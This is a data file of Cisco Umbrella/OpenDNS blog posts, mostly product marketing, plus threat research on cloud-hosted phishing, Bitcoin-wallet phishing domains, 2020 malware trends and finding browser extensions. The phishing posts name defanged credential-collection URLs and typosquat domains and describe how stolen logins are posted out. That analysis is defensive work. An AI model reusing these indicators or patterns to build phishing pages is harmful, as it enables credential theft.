{"website": "Cisco-Umbrella", "title": "Secure remote workers with the Cisco Umbrella roaming client", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/secure-remote-workers-with-the-cisco-umbrella-roaming-client", "abstract": "Working outside the office is no longer a trend or an office perk — it’s our new reality in 2020. And make no mistake – cyberattacks have not slowed down while so many people have begun working remotely outside the protections of the corporate office network. Enabling off-network endpoint protection for users is no longer optional – it needs to be a critical part of your remote worker cybersecurity strategy. Protect remote workers wherever they go It’s hard to imagine a world without our mobile phones, especially when it comes to working remotely from couches and kitchen tables. Smartphones increase our productivity, but their use also leads to increased security risks for organizations. Between smaller screens, multi-tasking, and limited visibility in mobile browsers (i.e. not being able to hover over links), conditions are ideal for end users to get fooled and click on malicious links. Research shows that 85% of attacks seen on mobile devices occur outside of an email inbox in media like SMS messaging, where advanced detection tools and overwhelmed security teams can often lack visibility into network traffic activity that point to cybercrime. 1 Delivering and managing a secure experience to roaming users can consume far more time, effort, and resources than IT and security teams can afford, especially when budgets are stretched thin. So how do you protect your roaming users on all devices? It’s simple: make sure they always carry Cisco Umbrella. Get off-network protection with Cisco Umbrella Your IT team probably has limited time — this was true before the rise in remote work, and it’s probably even more true right now. Cisco Umbrella combines multiple security functions into a single cloud-delivered service — helping you deliver the right level of security wherever your users are working. Umbrella offers easy-to-deploy roaming clients designed for Android OS, iOS, Google Chromebook, MacOS, Windows, and Cisco AnyConnect. These clients protect users from connections to malicious destinations and command-and-control callbacks at the DNS and IP layers, no matter where the device connects to the internet. Having a wide variety of deployment methods means that organizations can seamlessly secure all managed devices in minutes, not days or weeks. Even better, there’s no additional license fee to get remote user protection. All Cisco Umbrella packages provide roaming protection for Windows, MacOS, iOS, Chrome OS, and Android devices. With more users working remotely, they’re likely skipping the VPN. Sometimes it’s because they forget to connect, but other times, they might experience bandwidth restrictions or latency that cause a negative user experience. If you use Cisco AnyConnect, then you can simply enable the Umbrella roaming security module . It will instantly turn on and send all internet requests to Umbrella when the VPN is off, so users will be protected automatically anywhere they work. If you use a different VPN provider, no need to worry – you can deploy the Umbrella roaming client , which will work alongside any VPN. By using the Umbrella roaming client, administrators can minimize the time and cost spent dealing with malware infections, protect users against threats anywhere they go, and gain complete visibility into all internet traffic across all devices with device-level reporting. They can block users from visiting websites associated with phishing, cryptomining, ransomware, and other malware, and can enforce domain-level content filtering by specific categories like “gambling,” “social networking,” “games,” and more. Since policies are created directly in the Umbrella dashboard, the process of creating and managing policies is streamlined, and since enforcement occurs in the cloud, there is no negative impact to a device’s performance. Learn more For more details on how to deploy Umbrella to your remote and roaming users on different devices, check out some of the resources below. Enabling the Umbrella roaming module on Cisco AnyConnect Deploying the Cisco Umbrella roaming client Deploying the Umbrella Chromebook client Deploying the Cisco Security Connector for iOS Deploying the Cisco Umbrella Android module for AnyConnect 1 Enabling the Umbrella roaming module on Cisco AnyConnect", "date": "2020-09-29"},
{"website": "Cisco-Umbrella", "title": "The secure web gateway of the future is simple and scalable", "author": ["Rachel Ackerly"], "link": "https://umbrella.cisco.com/blog/the-secure-web-gateway-of-the-future-is-simple-and-scalable", "abstract": "If you’re like most businesses, you’ve already got a secure web gateway (SWG) deployed. In fact, 84% of businesses rely on their secure web gateway to protect their organization from malware infections, enforce corporate and regulatory policies, filter content, and more. As organizations move to the cloud, traditional appliance-based SWGs have been strained with more traffic, more strain, and less-than-effective security results. Traditional on-premises web gateways are unable to scale, and they can leave your users, devices, and data open to attack. Maybe that’s why a recent survey by ESG found that fewer than one in ten people are very satisfied with their existing secure web gateway solution. 1 Is it time for an upgrade? We think so. New needs drive new challenges which forces us to question our old ways of doing things. Is there a better, more effective way to secure our users, our workplaces, and our devices? Organizations both large and small want to secure their users wherever they access the internet while providing a streamlined user experience. In today’s cloud-obsessed world, we can all agree that an SWG must protect us from threats and malware, enforce acceptable use policies, log web traffic, filter content, and enable investigations — all without impeding performance. Now that’s a tall order — but we know it can be done. And we believe at Cisco it can be done better. Change is here. With 60% of cybersecurity experts predicting that the majority of their organization’s apps will be SaaS-based by 2021, and that 67% of all proxies will move to the cloud, all signs point to a change. The shift is already happening. Gaps in traditional SWG performance have opened the door for a cloud-delivered, scalable, and simple solution that can provide more complete visibility and more consistent protection for security teams. When talking with existing customers and prospects, one theme seems to resonate. The need to secure all internet activity, the need to accept traffic from all locations (including remote workers and roaming employees) and the ability to integrate with critical networking functions like software-defined wide area networks (SD-WAN) are key. The ability to unify security and networking functionality in a solution that is simple to manage, deploy, and configure ranks high on the “must have” list. The “must have” list Core functionality is expected. The ability to deliver full URL logging and reporting, support multiple traffic redirection methods, and provide tenant controls are just table stakes. Another no-brainer is multi-level content control. The rest of the list does not include any shockers: AV/malware scanning, full and selective decryption, file sandboxing, and application visibility and control. The difference is taking this core SWG functionality and marrying it with a modern architecture. If you can do that and integrate it with your existing network to improve performance, reduce management tasks, and eliminate capital expenditures, then you have a true game changer! The SWG of the future Cisco Umbrella is a cloud security service that unifies multiple security functions, including an SWG for today’s needs that provides robust, integrated protection. Umbrella also includes market-leading DNS-layer security, a cloud-delivered firewall, CASB functionality, threat intelligence, and more. What makes our SWG so much better than those others? Easy to deploy across all locations and users, on and off-network Reduced complexity and simplified tunnel management with Anycast technology for automated failover Unmatched threat intelligence that sees attacks, before they reach your network and endpoints Ask the tough questions Thinking about how to deploy a secure access service edge (SASE) service? A cloud-delivered SWG is a great place to start. Explore the benefits of a modern, cloud-delivered secure web gateway , and find out what SWG components and functions are necessary for today’s network and security architecture. Read the ebook: Have you outgrown your traditional secure web gateway? 1 ESG Survey Results, Transitioning Network Security Controls to the Cloud: The Emergence of Elastic Cloud Gateways, May 2020.", "date": "2020-09-22"},
{"website": "Cisco-Umbrella", "title": "Why cloud providers are top targets for phishing attacks", "author": ["Sneha Shekar"], "link": "https://umbrella.cisco.com/blog/why-cloud-providers-are-top-targets-for-phishing-attacks", "abstract": "84.7% of cyberattacks involve phishing. In such a scenario, it becomes very important to understand the various ways a phishing attack could occur. Phishing URLs are commonly found on cloud providers. This article will take you through why cloud providers are being used increasingly for phishing campaigns and what pattern an attack on these sites usually follows. Phishing pages hosted on cloud services like Microsoft Azure can trick users into believing that they are visiting a legitimate site. Firstly, these pages have the green lock sign displayed on the site. Users who don’t really go into the details may see the green lock symbol and think that the site is safe. However, the green lock merely symbolizes that the site is secure, which means that the traffic is encrypted, and the site itself may not necessarily be safe. Even if a user knows this difference and decides to inspect further, the page will have a valid SSL certificate signed by Microsoft. This happens because the page is hosted on Microsoft Azure. Moreover, many times the URL may contain windows[.]net or azurewebsites[.]net which may lead users to believe that it is a legitimate Microsoft site. Every week we identify many phishing sites that behave in this way. Let’s take a look at one of them: hXXps://enq42yzh.azurewebsites.net/caiTxU/ when a user goes to this url, it shows a Microsoft login page. The domain is registered to Microsoft, as per the WHOIS information available. The SSL certificate of the site is issued by Microsoft, which again leads the user to think the site is a legitimate one. However, when a user enters the login credentials on this page, the attacker gets the login ID and password, thus making the phishing attempt successful. To see how this happens, we inspect the source code of the page. In this particular case, after the user enters login credentials and clicks on the ‘Login’ button, they are simply taken back to the login page again. The attacker gets the user credentials. This can be seen in the source code of the page: In other cases, the source code may contain heavily obfuscated text. In the example below, the snippet contains text that is likely base64 encoded. Here, we took one such encoded part and decoded it. The decoded JavaScript code is shown below: Upon analyzing the code, we can see a variable gate that is a URL: hXXps://voicecenterserved[.]azurewebsites.net/assets/gate.php . A POST request is made to this URL through which the email and password entered by the user is sent. This destination URL is likely where the attacker stores the credentials. It acts as a C&C server. Sometimes, the link to the C&C server can be encoded in a hex string or is available directly in the page source of the site. The credentials obtained may then be used for a number of different things. These can be used to access various accounts of the victim, sell them to various third parties, use them for a particular campaign, etc. Phishing attacks of this type have been on the rise over the last few years. Phishing attacks targeted at SaaS and other webmail services still continue to be the biggest category of phishing (as per APWGs Q1 2020 report). By getting a user’s Microsoft or other similar SaaS login credentials, the attacker gets access to multiple accounts linked to that particular user ID. This makes the user vulnerable to a very wide threat landscape. Conclusion Cisco Umbrella resolves over 220 billion DNS requests daily, giving our researchers a unique view of the Internet to better identify trends on threats, faster. We are constantly finding new ways to uncover “fingerprints” that attackers leave behind and ways to build new statistical and machine learning models to automatically identify attacker infrastructure to pre-emptively neutralize it. This way, attacks can be stopped even before the specific nature of the attack is fully identified. Interested in trying out Umbrella? Sign-up for a free 14 day trial today.", "date": "2020-09-15"},
{"website": "Cisco-Umbrella", "title": "Attacks on wallets and AdWords correlate with Bitcoin price surge", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/protecting-bank-pocket-rise-criminal-activity-correlates-bitcoin-price-surge-holidays", "abstract": "Over the past year as cryptocurrency has steadily increased well past $800,  OpenDNS Labs has been diligently tracking Bitcoin wallet phishing campaigns. With this most recent uptick in price we have observed a recent rise during this holiday season in phishing domains to steal access to online wallets.  This latest spike was very similar to the the wave of phishing we observed this past summer when Bitcoin price had a sharp increase. Although most of the phishing sites we detect are specifically setup for phishing purposes we are also seeing an increase in the compromise of legitimate sites in which they are modified to host Bitcoin wallet phishing along with other phishing content. In this post we will discuss our latest findings in phishing content over these past couple months and also some of the new trends we have been observing in our DNS traffic. New trends in cyber attacks One of the most interesting trends we have been observing as of late is adversaries targeting Gmail accounts in order to gain access to Google Adwords and improve SEO thereby percolating these Blockchain.info phishes to the top of search results. Here are a few examples of WHOIS registrants we have detected which display this type of behavior: Figure 1 Figure 2 Figure 3 Figure 4 Figure 5 Our new IP and Registrant classification system that we have developed to pivot on results from our phishing classifier using Investigate data has proven well to detect these bulletproof phishing infrastructures targeting Blockchain wallets. With this we are also able to block these infrastructures before new phishing sites are created and hosted on them. Figure 6 Here’s an example of a compromised site exhibiting domain shadowing features hosting Blockchain.info phishing: blockchain.info-login-verification-portal-sign-in[.]blockchain[.]info[.]update-com-blockchainupdate-login-attempt-come[.]dheekshapromoters[.]com Compromised sites hosting Bitcoin wallet phishes are something we don’t normally see in the wild. It is more often the case that we see dedicated Bitcoin wallet phishing sites. This is an indicator that this is online wallet phishing is definitely here to stay. Here is the 2ld of that domain dheekshapromoters.com, which serves as an index page for many other phishing sites: Figure 7 Figure 8 Figure 9 Figure 10 Here is a list of a bunch of domains created by meiravash@hotmail.com spoofing Blockchain.info in November around the holidays as shopping season starts: Domain, WHOIS Creation Date blockchainls.info 2016-11-03 blockchanfo.info 2016-11-03 blockchianfo.info 2016-11-03 blockchainle.info 2016-11-04 blockchainln.info 2016-11-04 blockchianin.info 2016-11-05 blockchianls.info 2016-11-05 blockchianie.info 2016-11-08 blockchianle.info 2016-11-08 blockchianln.info 2016-11-08 blockchinfo.info 2016-11-14 blockchlanfo.info 2016-11-14 blocklchaina.info 2016-11-14 blockchanifo.info 2016-11-16 blockchianas.info 2016-11-16 blockichianfo.info 2016-11-16 blockchiania.info 2016-11-21 blockchianias.info 2016-11-21 blockchianies.info 2016-11-21 blockchianisa.info 2016-11-21 blockichianis.info 2016-11-21 blockchiansa.info 2016-11-22 blockchianse.info 2016-11-22 blockchiensa.info 2016-11-22 blackclhian.info 2016-12-07 blackichian.info 2016-12-07 blacklchian.info 2016-12-07 Figure 11 shows a visualization of one of the registrants with OpenGraphiti: Figure 11 The fact that our algorithms are detecting phishing campaigns as soon as they go live, and in some cases before they are even created/registered, is essential to providing the best protection for our users. However, it wouldn’t be possible to build those algorithms without a deep understanding of the initial cases that produced such campaigns. Our hypothesis’ are based on analysis of the next graphs, which include Google interest of the keyword “buy bitcoins” from Google, changes of the Bitcoin prices from Blockchain, ransomware infections and detected phishing attacks on the Bitcoin wallets from OpenDNS. Figure 12 As we can see from the graphs in Figure 12,  there is a strong correlation between popularity, Bitcoin price and Bitcoin phishing attacks. We also can observe that ransomware infections do not really correlate with Bitcoin price while most phishing campaigns against Bitcoin wallets actually do, meaning the more expensive Bitcoin will become the more attacks we will see. Peaks of ransomware infections are highly dependent on delivery methods and not necessarily Bitcoin’s popularity. Ransomware is, after all, some criminal’s stable malicious business. In Figure 11 we can see that peak of the infections correlates with the appearance of the Locky in November (when it also switched to mainly being delivered via phishing), while the least amount of infections was detected in June, when the Angler Exploit Kit disappeared. So we can hypothesize that even when phishing and ransomware campaigns share same infrastructure, they have different organizations behind them, which work independently. Also that explains the fact that injecting malicious Adword ads is the main delivery method of such phishing campaigns. Let’s try to reproduce actions of an average PC user in case of ransomware infection: Edward visits some website, his browser gets exploited via malicious ad, and 2 minutes later he sees this type of message on his screen (depends on ransomware family): Figure 13 So when Edward follows the URL he gets instructions to buy bitcoins with the list of places where he can do this. But just how much should he trust someone who just encrypted all of his data in exchange for ransom? That would be the perfect place for malicious actor to not only extort the ransom money, but also the user’s credentials. However, we haven’t seen any of phishing domains listed there from observed ransomware samples. So, if Edward searches on Google to find out how to buy bitcoins, only then does forged Adword accounts come in play. Edward gets served the phishing domain from Adwords, enters his credentials, buys bitcoins and pays the ransom. Everything seems fine but by now not only he lost money due to the ransom, but most of his personal information is compromised. Stolen credentials are a lot cheaper than most ransom, so ransomware authors would not try to steal credentials, but rather get paid. Conclusion It looks like these cryptocurrency technologies will continue to gain momentum into 2017, and with that so will criminal activity. OpenDNS Labs will continue to monitor these trends in our DNS traffic for phishing pages intended to steal online wallets’ credentials, and continue to share our results.", "date": "2016-12-22"},
{"website": "Cisco-Umbrella", "title": "Finding Browser Extensions To Hunt Evil!", "author": ["Brad Antoniewicz"], "link": "https://umbrella.cisco.com/blog/finding-browser-extensions-find-evil", "abstract": "Some browser extensions can be limited to just certain websites Browser extensions, sometimes called plug-ins or add-ons, provide all types of wondrous functionality on top of the web browser, some of which may be actually wanted by the user! These little gems, however, have also proved valuable to attackers. Volume 20 of Microsoft’s Security Intelligence Report demonstrates a year 2000-era marked increase in the rise of adware such as Win32/Diplugem . These types of threats register themselves a s a browser extension to inject advertisements right into the rendered page of the user. It’s actually pretty clever. Code Execution Too! Browser extensions may also pose increased risk to users since some of them run native code in the context of the browser. For instance, Internet Explorer has long supported ActiveX modules (.ocx) which are treated by the browser as a DLL and loaded directly into memory. In this scenario, the browser plug-in is almost the same as an executable, inasmuch as it has the potential to execute malicious code or run any program as the current user. While Internet Explorer allows you to define certain pre-approved websites for its add-ons to run and the most popular add-ons set this by default, most other add-ons run on all sites. By browsing to a specially-crafted website, an attacker can potentially enumerate installed add-ons and then invoke a vulnerability in them to gain control over the browser and ultimately over code execution. Needless to say, it is important to figure out what browser extensions may be installed on your users’ systems. We’ll look at uncovering these extensions in Internet Explorer 11 and Chrome 51.0.2704.84 on Windows 8.1 and MacOSX. These techniques may work on older or newer versions as well. Built-In Detection Since browser extensions can also be active without any visual indication in the browser, a good start is to dig into the browser’s built-in manager. Internet Explorer 11’s Add-on Manager can be found under Tools-> Manage Add-ons . By default, Internet Explorer will only show currently-loaded add-ons, so be sure to expand the view to include all add-ons: Show All Add-ons in IE11 Extensions can be found in Chrome under the options menu, then More tools -> Extensions or just chrome://extensions/ in the URL bar. Chrome Extensions Third-Party Tools The de facto tool most responders use for this purpose in Windows is Autoruns . It has the built-in capability to look across components on the whole system for executables and modules which get loaded automatically. One tab is Internet Explorer : Autoruns gives some visibility into IE add-ons Autoruns also has the ability to query these via the command line: Autoruns via the cmd line While this is great for responders, it is somewhat limited in that it only shows Internet Explorer add-ons, and doesn’t include all add-on types. As of Windows 8, Microsoft created a new registry location for add-ons that Autoruns doesn’t check. Finding Chrome Extensions with Python Every Chrome extension is given a unique identifier called an extensionid . This is just a 32-character long, base-16 encoding (using a-p instead of 0-9a-f) of the first 128-bits of the SHA256 hash of the RSA public key (that was a mouthful!). This ID is used locally and in the Chrome Web Store.  For instance, feedly has an extensionid of hipbfijinpcgfogaopmgehiegacbhmob – to look it up in the Web Store, just go to: https://chrome.google.com/webstore/detail/hipbfijinpcgfogaopmgehiegacbhmob On your local system, extensions are stored in directories named after their extensionids under the following location: ~/L ibrary/Application Support/Google/Chrome/Default/Extensions/ (MacOSX) %APPDATA% L ocal G oogle C hrome U ser Data D efault E xtensions (Windows) Each extension directory includes a manifest.json which holds content about the extension, including update URLs and the name. Sometimes these name values are not too useful. Chrome extensions support multiple languages, so an often more comprehendible name value can be found in the _locale/en/messages.json file under the keys appName , extName , or app_name . Here’s a quick code snippet to demonstrate this: Chrome also maintains a Preferences.json file which is also a great resource to query for extensions. It contains tons of information. Here’s an example of querying it for extension content: Finding Internet Explorer Add-ons with PowerShell Internet Explorer’s add-ons are spread across a few different registry entries , organized by a GUID, a unique identifier Windows calls a CLSID , that is assigned COM objects . Unfortunately, the exact structure of how these entries are organized varies between keys so there isn’t just one way to query them. While you can also query these registry keys using Python , I wanted to highlight querying them with PowerShell because it can be easily adapted to run on a remote system or incorporated into a script. Querying the registry is just a matter of using Get-ItemProperty and recursing through the values. For instance, a subset of the registry keys that includes add-ons is structured such that a ClsidExtension key holds the CLSID of the browser add-on. To query these types we can do the following: All CLSIDs are stored in single registry key HKLM:SOFTWAREClassesCLSID . You can get the registered name of the CLSID by looking under the InProcServer32 entry. Here’s an example of looking up a CLSID via PowerShell: Finding Chrome and IE Extensions in Windows and MacOSX To help make this all much easier, I wrote a script to do it all for you 🙂 https://github.com/brad-anton/extension_finder Running is easy, just run python extension_finder.py from your home directory to give it a whirl (you’ll need tabulate ). If you’d rather just look for IE add-ons with PowerShell, run .FindIEExtensions.ps1 from a PS> command prompt. Enjoy!", "date": "2016-06-16"},
{"website": "Cisco-Umbrella", "title": "From Query Logs to Visualization", "author": ["Colin Seale"], "link": "https://umbrella.cisco.com/blog/from-query-logs-to-visualization", "abstract": "Researchers and scientists use data visualizations to better understand data and communicate results. Good visualizations can provide insight into a dataset that might otherwise be overlooked. In this post, we’ll go through the process of creating graphic insight from an abstract dataset by building an actual data visualization step-by-step. First: The Data To build this visualization, we start with a 10-minute log chunk of raw DNS data that gets dumped into an Amazon S3. Log chunks are the rawest form of data the OpenDNS research team uses to do analysis, and they make for a good place to start talking about the life of a data visualization. If you want to know more about the process of getting log chunks, check out this post from Josh Pyorre . Log chunks are text data that won’t be useful for our visualization without some cleaning and parsing. The goal of the visualization is to see what the traffic looks like when connecting resolver requests based on the order they were received. To create latitude and longitude coordinates with IP addresses, I used the Maxmind API available via pip. This is all put together in a browser-consumable .csv file (see some of the python code below). Next: The Visualization To make the query patterns visualization, I used Three.js, a JavaScript API used to create 3D computer graphics in a web browser. Because Three.js uses the GPU, which is made for handling pixel processing, it’s perfect for making visualizations that use a lot of data. After a first step of creating a scene with lighting, next a globe on which all of the lines will sit should be created , which is easy in Three.js. To help make your planet look more realistic, you can find earth textures that contain elevation/bump maps with a quick Google search; GPUs can then sample those 2D texture images and project the texture on your 3D globe object using UV mapping. You can use as many textures as you like to render your earth replica, but only basic earth texture mapping is required. For the sake of clarity, less is definitely more here; the simpler your graph or chart is, the more likely its insight is to be easily understood. UV Mapping Diagram After finding appropriate textures, you can use the handy ImageUtils and loadTexture method to load the image, making sure to pass in the THREE.UV Mapping object. Then, Three.js will map your textures onto a sphere geometry with dimensions you select to create your planet.", "date": "2016-07-25"},
{"website": "Cisco-Umbrella", "title": "Protect remote workers today while building the network of tomorrow", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/protect-remote-workers-today-while-building-the-network-of-tomorrow", "abstract": "Remote work isn’t just the future – it’s here and now. With most, if not all, of your users working from home , you need to deliver the same level of protection for the sensitive, business-critical data on their laptops and mobile devices as if they were working in the office. Cybercrime hasn’t slowed down during 2020, and the persistent work-from-home situation is a prime candidate for exploits . The VPN blind spot Many remote employees skip connecting to the VPN, which leaves their unprotected machines exposed to malware and data exfiltration. But why would so many users bypass the easy safety net of the VPN? In some cases, a user simply forgets to connect at the start of a workday. Sometimes, if everyone tries to connect at the beginning of the workday on Monday, a user might have problems connecting, and decides to get started on work without the VPN (and forgets to try again later). After all, many SaaS applications, like O365, can be configured to work without a VPN connection. Sometimes, however, a user will disconnect from the VPN because of network performance issues. Maybe the SaaS applications perform better without it, and since they no longer need to be on the VPN for these applications to function, it’s easy to want to trade speed and productivity for protection from cyberthreats. More traffic, higher costs Most organizations designed their VPN hardware-based framework to handle a predictable population of remote and roaming users. When every employee suddenly moves to 100% remote work, the hardware-based VPN faces an unexpected surge in bandwidth requirements. With no clear end to remote working in sight, IT teams are forced to make some tough decisions: should they redesign their network to handle the new surge in VPN traffic? This requires purchasing new hardware and access to a building to install it, along with spending budget that may or may not be available to spend. Enter cloud-delivered security New research from Gartner investigates how to secure access in a cost-effective way, today and in the future. To achieve these goals, Gartner recommends a Zero Trust Network Access (ZTNA) identity and access framework, in conjunction with a Secure Access Service Edge (SASE) networking and security infrastructure . By deploying these two cloud-delivered frameworks in unison, organizations can deliver secure access at scale while keeping costs down and enable better workplace productivity. By taking the pressure off existing hardware (like firewalls and VPN endpoints), a combined ZTNA and SASE approach gives organizations the speed and flexibility they need in their networks to aid remote worker productivity, without compromising security posture. And by choosing providers that can deliver these capabilities from the cloud, IT teams can deploy, configure, and manage the services quickly without the need for physical access to hardware inside buildings. After all, the IT administrators are working from home, too. In addition to ZTNA, the research recommends the use of a secure web gateway (SWG) for URL and malware filtering and a cloud access security broker (CASB) for visibility and control of activities inside SaaS applications. Many IT teams are dealing with smaller budgets than expected for the upcoming fiscal year and seek to cut costs wherever possible. One easy way to simplify purchasing and save on overlapping functionality is by selecting vendors that can deliver multiple capabilities in one converged, cloud-delivered service and bill based on consumption today, not on expected scale for tomorrow. Learn more by reading the rest of the research report here . Start today, plan for tomorrow Cisco Umbrella combines multiple security functions, including SWG and CASB, into a single cloud-delivered service — helping you deliver the right level of security anywhere your users work. If your users skip the VPN, Umbrella keeps them covered from whatever threats might be falling out of the digital clouds. If you already use Cisco AnyConnect as a VPN client, then you can simply enable the Umbrella roaming security module — no additional agents required. Easily add more functionality as your network evolves and grows, delivering flexible access and security when and how you need it.", "date": "2020-09-08"},
{"website": "Cisco-Umbrella", "title": "Cisco Umbrella discovers evolving, complex cyberthreats in first half of 2020", "author": ["Austin McBride"], "link": "https://umbrella.cisco.com/blog/cisco-umbrella-discovers-evolving-cyberthreats-in-2020", "abstract": "With economies on lifelines and work being done by teleconference calls, it may seem sometimes like the whole world is on hiatus. But the reality is that cyberattackers aren’t sleeping. Their tactics and targets may be shifting and changing, but the threats are not going away. Key Highlights In the first half of 2020, Cisco Umbrella identified the following threat trends: an evolution in repurposing trojans and droppers for new forms of malware delivery an increase in obfuscation and the use of macros and other fileless* malware to evade traditional antivirus (A/V) defenses a rise in threats to managed service providers (MSPs) loads of phishing tactics with COVID-19 related themes (which comes as no surprise – learn more about this in our earlier blog post). Cisco Umbrella global network Before we dig into the data, it’s helpful to remind ourselves how the Cisco global network views the threat landscape. Our 32+ customer facing data centers process 220+ billion domain naming service (DNS) requests daily. This gives us a unique perspective on global DNS traffic. This analysis is based on aggregated DNS query logs paired with scrubbed and anonymized customer demographic information. Cisco Umbrella protects against more than 7 million malicious domains and IPs, while discovering over 60,000 new malicious destinations (domains, IPs, and URLs) on a daily basis. Each node of attack infrastructure is an opportunity to identify and neutralize before it can be used for new attacks. Cisco believes it’s better to predict and prevent cyberattacks . 2019 2020 Phishing moved into second place behind malware in the first half of 2020 Looking at our entire customer base in the first half of 2020: 91% of them saw a domain linked to malware, 83% of them saw a domain linked to phishing, 67% of them saw a domain linked to cryptomining, and 60% of them saw a domain linked to trojans. Last year, trojans were the second most active at 59% and phishing was in the fourth spot at 46% impacted. One of the reasons for the shift this year was due to the COVID-19 pandemic and the huge increase in malicious phishing sites preying on peoples’ fears around the virus. Top attacks impacting Umbrella customers: Looking at the top attacks we’ve seen so far in 2020, it’s not surprising that cryptomining takes the top spot. Cryptomining was also the #1 attack last year by query volume. We saw more cryptomining in 2019 than in 2020, but the reduction in crypto query volume in 2020 wasn’t enough to drop cryptomining from the #1 spot. However, it is important to note that cryptomining is inherently chattier than these other attacks, so its strong lead over these other top attacks is not as pronounced as it appears in terms of DNS query volume. Trend #1: A new form of malware delivery We’re seeing an evolution in repurposing trojans and droppers for new forms of malware delivery. Emotet comes in at #2. It started as a successful banking trojan, but quickly evolved into an even more successful delivery vehicle for malware dropping. Attackers are clearly sticking with what works. With its sophisticated modular architecture, worm-like propagation, and casting a wide net to impact the maximum number of victims – Emotet has become a workhorse for delivering numerous types of malware. Ursnif/Gozi is another example of a trojan/dropper that is evolving its use cases. This attack type is being spread as a standalone version and as a dropper for other malware. It leverages email thread hijacking and abuse of trusted services such as Google Drive. Its targeted approach to the choice of delivery method depending on potential victims has made it popular in a wide variety of attacks. Trend #2: Complexity, macros and fileless malware on the rise Perhaps one of the biggest trends we have continued to see in the first half of 2020 has been the rise of more complex, multi-staged attacks. These attacks use new delivery mechanisms such as macros and other legitimate application functionality to evade A/V detection, obfuscation of data exfiltration (e.g., steganography), and coordination through command-and-control (C2) infrastructure. For example, the above attack chain illustrates how malspam delivers an innocent-looking document that uses a macro or PowerShell (functionality embedded into the application used to open the file). This then leads to a payload/dropper that disables security controls, establishes persistence, and downloads additional malware. When all of the targeted data is exfiltrated, TrickBot is downloaded and launched. TrickBot processes take control of the domain controller via SMB Exploit which leads to network compromise. The last step in the infection chain is ransomware, which encrypts all affected components. A variant on the data exfiltration step may be to use steganography. Steganography is the art of concealing information inside pictures. Attackers have used this technique specifically during this pandemic phase to exfiltrate data using steganography and is part of legitimate traffic. Similarly, in the phase where the file employs some fileless automation such as Macros 4.0, VBA or PowerShell, the attack can make use of the legitimate software automation to obfuscate and then deobfuscate commands. Following is an example for a Macros 4.0 exploit using a Binary Interchangeable File Format (BIFF), which hides an embedded Microsoft Excel file. The download happens from the attackers’ infrastructure, which apparently is a series of compromised WordPress sites. Attackers are constantly running a parallel campaign throughout the year in targeting small/medium businesses WordPress sites and adding it to their compromised kitty of domains. These domains are loaded within the Excel files, so that when de-obfuscation happens, it ends up downloading the actual .exe malware from compromised WordPress domains. Trend #3: A new favorite target – managed service providers (MSPs) Threat Traffic by Industry Vertical: 2019 2020 The distribution of threat traffic by vertical has changed slightly from its distribution in 2019. Managed service providers at 28.47% has overtaken financial services at 23.49% for the top spot of most impacted vertical. Higher education traffic has fallen considerably in its share of the pie from the #2 spot to #5. This considerable drop in higher education threat traffic is most likely the result of students not being present in person for classes. Trend #4: COVID click bait drives increase in phishing The COVID-19 pandemic has a lot of people on edge. Many of us are paying closer attention to emails and article headlines offering up COVID-19 stats in our area or where to go to get free testing. Malicious actors have taken advantage of our interest in the topic and set up numerous sites to phish for credentials and drop malware. The largest jump in malicious COVID-19 query traffic in North America was 6.3X and occurred from the beginning of February through the end of June. The largest jump in malicious COVID-19 query traffic outside of North America was 13.2X in the period from the beginning of March through the end of May. 2020 – the year that keeps on giving The first half of 2020 has been eventful with the rise of COVID-19 and the widespread move to remote work for much of the global workforce. The landscape has changed — more considerably for some sectors than others — but the bottom line is that malicious actors are still working hard to infiltrate your environment. A “little” pandemic will slow them down, but not stop them. Thanks to Shyam Sundar Ramaswami for contributing the malware sample analysis . About Cisco Umbrella Cisco Umbrella delivers the most secure, reliable, and fastest internet experience to more than 100 million business and consumer users daily. Umbrella unifies firewall, secure web gateway, DNS-layer security cloud access security broker (CASB), and threat intelligence solutions into a single cloud service to help businesses of all sizes secure their network. As more organizations embrace direct internet access, Umbrella makes it easy to extend protection to roaming users and branch offices. Leveraging insights from Cisco Talos, one of the world’s largest commercial threat intelligence teams with more than 300 researchers, Umbrella uncovers and blocks a broad spectrum of malicious domains, IPs, URLs, and files that are being used in attacks. We also feed huge volumes of global internet activity into a combination of statistical and machine learning models to identify new attacks being staged on the internet. Learn more about how we identify attacks with threat intelligence in this blog post from Chris Riviere. In a recent test, Cisco Umbrella took the #1 spot in security efficacy against today’s threats. AV-TEST performed a review of Cisco cloud security solutions alongside comparable offerings from other vendors. Learn more about how AV-TEST put our security to the test (and how we won). Read the report here . * Fileless malware uses existing legitimate applications and system functionality to infiltrate a computer, leaving no signature and thereby evading traditional antivirus defenses. It typically functions by using legitimate tools for malicious purposes, such as LOLBins, and can include Microsoft Office Macros, PowerShell, among others.", "date": "2020-08-18"},
{"website": "Cisco-Umbrella", "title": "Don't want to block everything?  Use your allowlist!", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/opendns-domain-allowlisting", "abstract": "When we launched OpenDNS Adult Site Blocking in June we gave you the power to block adult websites with simple categories. However, when blocking categories of sites there is sometimes a need for exceptions; that’s why we’re happy to announce the launch of a Domain Allowlist feature . The Domain Allowlist feature is pretty simple, and I like how we explain it in the Dashboard: An allowlist is a list of domains that will never be blocked on your network regardless of the content filtering categories you’ve turned on. For example, if you are blocking adult-themed sites but really want to visit celebrity gossip site tmz.com, you can add it to the allowlist below and get all the benefits of adult site blocking but still get your Paris Hilton fix. Thanks to everyone who wrote in to tell us they wanted this feature. Even more thanks to Aaron, Joe, and Noah for making this happen on our side so quickly.", "date": "2007-08-09"},
